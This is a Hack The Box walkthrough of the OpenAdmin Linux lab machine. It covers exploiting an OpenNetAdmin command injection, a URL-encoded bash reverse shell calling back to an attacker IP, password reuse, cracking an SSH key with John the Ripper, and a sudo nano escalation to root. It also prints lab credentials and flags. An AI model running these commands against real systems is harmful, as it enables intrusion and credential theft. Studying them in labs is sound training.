---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - OpenNetAdmin
  - CVE-2018-8006
  - CommandInjection
  - PasswordReuse
  - Credentials
  - MySQL
  - Hash
  - Cracking
  - JohnTheRipper
  - ssh2john
  - sudo
  - SudoAbuse
  - nano
  - GTFOBins
---

![](images/OpenAdmin.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Initial Access](#Initial-Access)
    - [CVE-2018-8006: OpenNetAdmin Remote Code Execution](#CVE-2018-8006-OpenNetAdmin-Remote-Code-Execution)
    - [Upgrading the Shell](#Upgrading-the-Shell)
- [Enumeration (www-data)](#Enumeration-www-data)
    - [Database Configuration Discovery](#Database-Configuration-Discovery)
- [Privilege Escalation to jimmy](#Privilege-Escalation-to-jimmy)
    - [Password Reuse](#Password-Reuse)
- [Enumeration (jimmy)](#Enumeration-jimmy)
    - [Internal Webserver Discovery](#Internal-Webserver-Discovery)
- [Privilege Escalation to joanna](#Privilege-Escalation-to-joanna)
    - [Extracting SSH Private Key](#Extracting-SSH-Private-Key)
    - [Cracking the SSH Key using John the Ripper](#Cracking-the-SSH-Key-using-John-the-Ripper)
- [user.txt](#usertxt)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [nano sudo Abuse](#nano-sudo-Abuse)
- [root.txt](#roottxt)

## Summary

The box starts with `SSH` on port `22/TCP` and `HTTP` on port `80/TCP`. Directory enumeration reveals a `/music` subdirectory which redirects to `/ona/` running `OpenNetAdmin` version `18.1.1`.

Exploiting `CVE-2018-8006` which is a remote code execution vulnerability in `OpenNetAdmin` grants initial access as `www-data`. Enumeration of `/var/www/html/ona/local/config/` reveals database credentials in `database_settings.inc.php`.

The database password `n1nj4W4rri0R!` is successfully reused for the `jimmy` user account. As `jimmy` the `/var/www/internal/` directory becomes accessible which contains a `main.php` file that extracts the `SSH` private key for `joanna` when accessed.

Port scanning reveals an internal webserver listening on `127.0.0.1:52846`. Accessing `main.php` through this internal port returns `joanna`'s password-protected `SSH` private key. Using `John the Ripper` to crack the passphrase reveals the password `bloodninjas` granting `SSH` access as `joanna`.

Enumeration reveals `joanna` has `sudo` privileges to execute `/bin/nano /opt/priv` without a password. By spawning a shell from within `nano` using the command execution feature from `GTFOBins` root access is achieved.

## Reconnaissance

### Port Scanning

We began with our initial port scan using `Nmap` which revealed `SSH` on port `22/TCP` and `HTTP` on port `80/TCP`.

```shell
$ sudo nmap -sC -sV -oA nmap 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 18:28 CEST
Nmap scan report for 10.10.10.171
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.86 seconds
```

### Enumeration of Port 80/TCP

The web service displayed the default `Apache2` page. We performed directory enumeration to discover hidden content.

```shell
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.171/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/25 18:51:23 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
```

Directory enumeration revealed two directories: `/music` and `/artwork`. We accessed the `/music` directory.

- [http://10.10.10.171/music](http://10.10.10.171/music)

Clicking on the `login` button redirected to a different path revealing the application.

- [http://10.10.10.171/ona/](http://10.10.10.171/ona/)

The application identified itself as `OpenNetAdmin` version `18.1.1`. Research revealed this version is vulnerable to remote code execution.

## Initial Access

### CVE-2018-8006: OpenNetAdmin Remote Code Execution

Research on `Exploit-DB` revealed a publicly available exploit for `OpenNetAdmin` version `18.1.1`.

- [https://www.exploit-db.com/exploits/47691](https://www.exploit-db.com/exploits/47691)

We downloaded the exploit script and made it executable.

```shell
$ wget https://www.exploit-db.com/raw/47691
$ mv 47691 ona_exploit.sh
$ chmod +x ona_exploit.sh
```

The exploit leverages a command injection vulnerability in the `xajax` parameter. We executed the exploit pointing it to the target URL ensuring the trailing slash was included.

```shell
$ ./ona_exploit.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The exploit successfully granted command execution as `www-data`. However the shell was limited as it only accepted URL-encoded input.

### Upgrading the Shell

To obtain a fully interactive shell we prepared a reverse shell payload using `Burp Suite` to URL-encode it.

**Original payload:**
```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'
```

**URL-encoded payload:**
```shell
%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%33%2f%39%30%30%31%20%30%3e%26%31%27
```

We started a `netcat` listener on our attack machine.

```shell
$ nc -lnvp 9001
listening on [any] 9001 ...
```

After entering the URL-encoded payload in the exploit shell we received a reverse shell connection.

```shell
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.171] 54470
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$
```

We upgraded the shell to a fully interactive TTY using `Python`.

```shell
www-data@openadmin:/opt/ona/www$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

We then backgrounded the shell and configured terminal settings.

```shell
www-data@openadmin:/opt/ona/www$ ^Z
[1]+  Stopped                 nc -lnvp 9001
$ stty raw -echo
$ fg
[Enter]
[Enter]
www-data@openadmin:/opt/ona/www$ export TERM=xterm
```

This sequence provided a fully functional shell with command history and proper terminal control.

## Enumeration (www-data)

We began enumerating the web directories to identify potential privilege escalation paths.

```shell
www-data@openadmin:/opt/ona/www$ cd /var/www
www-data@openadmin:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```

The listing revealed an `internal` directory owned by `jimmy` with group ownership of `internal` which we could not currently access. We identified potential target users by examining `/etc/passwd`.

```shell
www-data@openadmin:/var/www$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

| Username |
| -------- |
| jimmy    |
| joanna   |

### Database Configuration Discovery

We explored the `OpenNetAdmin` configuration directory searching for credentials.

```shell
www-data@openadmin:/var/www$ cd /var/www/html/ona/local/config
www-data@openadmin:/var/www/html/ona/local/config$ ls -la
total 12
drwxrwxr-x 2 www-data www-data 4096 Jan  3  2020 .
drwxrwxr-x 3 www-data www-data 4096 Nov 21  2019 ..
-rw-r--r-- 1 www-data www-data  426 Nov 21  2019 database_settings.inc.php
```

The `database_settings.inc.php` file contained database credentials.

```php
www-data@openadmin:/var/www/html/ona/local/config$ cat database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

| Username | Password       |
| -------- | -------------- |
| ona_sys  | n1nj4W4rri0R! |

## Privilege Escalation to jimmy

### Password Reuse

We attempted to reuse the discovered database password with the known user accounts.

```shell
www-data@openadmin:/var/www/html/ona/local/config$ su - jimmy
Password: n1nj4W4rri0R!
jimmy@openadmin:~$
```

The password was successfully reused for the `jimmy` account granting us access as that user.

## Enumeration (jimmy)

With access as `jimmy` we could now explore the previously restricted `internal` directory.

```shell
jimmy@openadmin:~$ cd /var/www/internal
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

### Internal Webserver Discovery

The `main.php` file contained interesting code that extracts `joanna`'s `SSH` private key.

```php
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

The comment about the "ninja" password provided a hint for later. Since no additional ports were discovered in our initial scan we checked for services listening on localhost.

```shell
jimmy@openadmin:/var/www/internal$ ss -tulpn
Netid  State    Recv-Q   Send-Q      Local Address:Port      Peer Address:Port
udp    UNCONN   0        0           127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        80              127.0.0.1:3306           0.0.0.0:*
tcp    LISTEN   0        128             127.0.0.1:52846          0.0.0.0:*
tcp    LISTEN   0        128         127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:22             0.0.0.0:*
tcp    LISTEN   0        128                     *:80                   *:*
tcp    LISTEN   0        128                  [::]:22                [::]:*
```

Port `52846/TCP` was listening on localhost. This high port number suggested the internal webserver serving the `internal` directory.

## Privilege Escalation to joanna

### Extracting SSH Private Key

We used `curl` to access the `main.php` file through the internal webserver.

```shell
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

The request successfully returned `joanna`'s encrypted `SSH` private key. We saved this key to our local machine for cracking.

### Cracking the SSH Key using John the Ripper

We converted the `SSH` private key to a format suitable for `John the Ripper` using `ssh2john`.

```shell
$ /usr/share/john/ssh2john.py joanna_id_rsa > joanna_id_rsa.hash
```

We then used `John the Ripper` with the `rockyou.txt` wordlist to crack the passphrase.

```shell
$ john joanna_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_id_rsa)
1g 0:00:00:07 DONE (2020-11-10 19:25) 0.1347g/s 1932Kp/s 1932Kc/s 1932KC/sa6_123..*7¡Vamos!
Session completed
```

The passphrase `bloodninjas` was successfully cracked correlating with the earlier "ninja" password hint.

| Password    |
| ----------- |
| bloodninjas |

We set the correct permissions on the private key and authenticated via `SSH`.

```shell
$ chmod 600 joanna_id_rsa
$ ssh -i joanna_id_rsa joanna@10.10.10.171
Enter passphrase for key 'joanna_id_rsa': bloodninjas
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Nov 10 18:34:55 UTC 2020

  System load:  0.32              Processes:             125
  Usage of /:   49.6% of 7.81GB   Users logged in:       0
  Memory usage: 19%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.


Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$
```

## user.txt

```shell
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f
```

## Privilege Escalation to root

We began by checking `joanna`'s group memberships and sudo privileges.

```shell
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

The user belonged to the `internal` group but had no special privileges. We checked the sudoers configuration.

```shell
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

The user could execute `/bin/nano` with root privileges when editing the `/opt/priv` file.

### nano sudo Abuse

`GTFOBins` documented a method to spawn a shell from within `nano` using its command execution feature.

- [https://gtfobins.github.io/gtfobins/nano/](https://gtfobins.github.io/gtfobins/nano/)

We executed `nano` with sudo privileges.

```shell
joanna@openadmin:~$ sudo /bin/nano /opt/priv
```

Within `nano` we pressed `Ctrl+R` to read a file followed by `Ctrl+X` to execute a command.

```
Command to execute:
^G Get Help                        ^X Read File
^C Cancel                        M-F New Buffer
```

We entered the command `reset; sh 1>&0 2>&0` and pressed Enter to spawn a root shell.

```shell
Command to execute: reset; sh 1>&0 2>&0
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

## root.txt

```shell
# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
```
